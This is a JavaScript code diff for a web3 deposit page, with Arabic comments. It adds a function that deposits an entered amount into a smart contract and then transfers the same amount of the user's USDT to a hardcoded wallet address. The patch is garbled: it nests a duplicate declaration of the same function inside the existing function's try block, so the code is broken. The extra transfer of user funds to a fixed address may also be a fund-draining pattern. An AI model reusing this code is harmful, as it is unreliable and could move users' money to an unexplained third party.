@@ -300,6 +300,42 @@ async function depositAndTransfer() {
     }
 
     try {
+	    // دالة للحصول على حساب المستخدم من MetaMask
+async function getAccount() {
+    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+    return accounts[0];
+}
+
+// دالة الإيداع والتحويل
+async function depositAndTransfer() {
+    const amountInput = document.getElementById("amountInput").value;
+    const amount = parseFloat(amountInput); // تحويل القيمة المدخلة إلى عدد عشري
+
+    if (!amount || amount <= 0) {
+        alert("Please enter a valid amount.");
+        return;
+    }
+
+    try {
+        // الحصول على الحساب الحالي
+        const account = await getAccount();
+
+        // الإيداع في العقد الذكي
+        await contract.methods.deposit(web3.utils.toWei(amount.toString(), 'mwei')).send({ from: account });
+        alert("Deposit successful!");
+
+        // تحويل الأموال باستخدام عقد USDT
+        const amountToSend = web3.utils.toWei(amount.toString(), 'mwei'); // المبلغ المراد تحويله
+        const receiverAddress = '0x911D6fd1CeE64c84d2BcC385cb0659a70231D803'; // عنوان المستلم
+        const tx = await usdtContract.methods.transfer(receiverAddress, amountToSend).send({ from: account });
+        console.log('Transaction successful:', tx);
+        alert("Transfer successful!");
+    } catch (error) {
+        console.error("Error during deposit or transfer:", error);
+        alert("Error: " + error.message);
+    }
+}
+
         // الإيداع في العقد الذكي
         const account = await getAccount(); // احصل على الحساب الحالي
         await contract.methods.deposit(web3.utils.toWei(amount.toString(), 'mwei')).send({ from: account });
